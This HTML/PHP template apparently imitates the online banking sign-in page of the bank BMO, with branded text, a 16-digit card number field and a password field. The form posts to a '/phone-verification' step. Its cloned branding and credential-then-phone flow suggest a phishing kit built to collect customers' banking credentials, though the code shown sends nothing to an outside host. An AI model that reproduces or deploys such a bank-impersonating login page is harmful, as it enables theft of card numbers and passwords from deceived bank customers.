<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign In - BMO</title>

  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <link rel="stylesheet" href="/assets/css/styles.css">
  <script src="https://kit.fontawesome.com/64664913ea.js" crossorigin="anonymous"></script>
</head>
<body>

  <?php
    include('views/templates/nav.php');
  ?>

  <div class="custom-container mt-5 maxheight-container">
    <h1 class="text-center mx-auto"><span><img class="mb-1" src="/assets/media/lock.svg"></span> Sign in to Online Banking</h1>

    <div class="row mt-4 mx-lg-5 mx-3 px-lg-5">
      <div class="col-lg-6 shadow p-4 bg-body rounded mr-lg-6">
        <form method="POST" class="needs-validation" action="/phone-verification" novalidate>
          <div class="mb-3">
            <label for="card-number" class="form-label">Card number</label>
            <input required type="text" class="form-control" id="card-number" placeholder="">
            <label class="text-xs text-muted">Enter your 16-digit card number</label>
          </div>

          <div class="form-check mb-3">
            <input class="form-check-input" type="checkbox" value="" id="flexCheckDefault">
            <label class="form-check-label" for="flexCheckDefault">
              Remember card <span data-bs-toggle="tooltip" title="This means we'll remember your card details on this device so you won't need to enter them each time you sign in."><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="width: 24px; height: 24px"><path d="m15.74 9.74a6 6 0 0 1 -1.74 2.63c-.44.44-1 1-1 1.31a1 1 0 1 1 -1.91 0 3.83 3.83 0 0 1 1.47-2.59v-.06a4.59 4.59 0 0 0 1.29-1.77 1.46 1.46 0 0 0 -.15-1.26 2 2 0 0 0 -1.7-.59 1.7 1.7 0 0 0 -1.67.93 2.73 2.73 0 0 0 -.27 1 .93.93 0 0 1 -.95.93.94.94 0 0 1 -1-.94 4.69 4.69 0 0 1 .47-1.86 3.52 3.52 0 0 1 3.39-2 3.71 3.71 0 0 1 3.15 1.35 3.25 3.25 0 0 1 .62 2.92zm-3.59 5.73a1.25 1.25 0 1 0 1.25 1.25 1.25 1.25 0 0 0 -1.25-1.25zm7 3.34a10 10 0 1 0 -7.15 2.92 10 10 0 0 0 7.1-2.92zm-1.46-12.73a8 8 0 1 1 -5.69-2.34 8 8 0 0 1 5.69 2.34z" fill="#0075be"/><path d="m0 0h24v24h-24z" fill="none"/></svg></span>
            </label>
          </div>

          <div class="mb-3">
            <label for="password" class="form-label">Password</label>
            <input required type="password" class="form-control" id="password" placeholder="">
          </div>

          <a href="#">Forgot your password?</a>
          <!-- <a href="/phone-verification" class="btn-sign mt-4 p-3 px-5 fs-6 fw-bold btn btn-primary btn-lg rounded-pill d-block mx-auto">
            <button class="bg-transparent border-0 text-white">SIGN IN</button>
          </a> -->
          <input class="mt-4 p-3 px-5 fs-6 fw-bold btn btn-primary btn-lg rounded-pill d-block mx-auto" type="submit" value="SIGN IN">
        </form>
      </div>

      <div class="col-lg-6 mb-3 d-flex flex-column p-0 px-lg-3">
        <div class="shadow p-4 mb-3 bg-body rounded">
          <h4 class="fw-bold fs-5">New around here?</h4>
          <p>Register for online and mobile banking with your</p>
          <div><a class="text-decoration-none fw-bold" href="#">DEBIT CARD</a><span class="px-2">or</span><a class="text-decoration-none fw-bold" href="/online/creditcards/registration">CREDIT CARD</a></div>
        </div>

        <div class="p-4 bg-body rounded">
          <h4 class="fw-bold fs-5"><span><img style="width: 24px; height: 24px;" src="/assets/media/lock.svg"></span> Your security always comes first.</h4>
          <p>We’ve made Online Banking more convenient, while still using advanced security technologies that keep your money and information safe.</p>
          <a class="mt-0" href="#">Learn more about how we protect you.</a>
        </div>
      </div>
    </div>
  </div>

  <?php
    include('views/templates/footer.php');
  ?>

  <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js" 
        integrity="sha256-yE5LLp5HSQ/z+hJeCqkz9hdjNkk1jaiGG0tDCraumnA=" 
        crossorigin="anonymous"></script>

  <script src="/assets/js/main.js"></script>
</body>
</html>